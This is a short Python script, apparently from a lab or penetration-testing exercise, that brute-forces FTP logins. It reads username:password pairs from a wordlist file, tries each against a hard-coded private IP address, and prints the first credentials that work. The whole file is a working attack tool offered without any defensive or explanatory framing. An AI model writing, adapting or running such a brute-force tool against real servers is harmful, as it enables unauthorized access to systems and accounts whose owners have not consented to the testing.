from ftplib import FTP

def read_file_to_list(file_path):
    lines = []
    try:
        with open(file_path, 'r') as file:
            lines = [line.rstrip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
    
    return lines

def connect_ftp(host, username, password):
    ftp = FTP(host)
    try:
        ftp.login(username, password)
    except Exception as e:
            #print(f"Error connectinng ftp : {e}")                       
            return 1
    return ftp


def ftp_brute_force(ip, ftp_list):
    for entry in ftp_list:
        ins = entry.split(":")
        ret = connect_ftp(ip, ins[0], ins[1])
        if ret == 1:
            continue
        else:
            print(f"Found credentials: username {ins[0]}, password: {ins[1]}")
            ret.quit()
            print("Disconnected from FTP server")
            return


if __name__ == "__main__":
    l = read_file_to_list("./wordlists/ftp_list.txt")
    ip = '10.12.0.40'
    ftp_brute_force(ip, l)

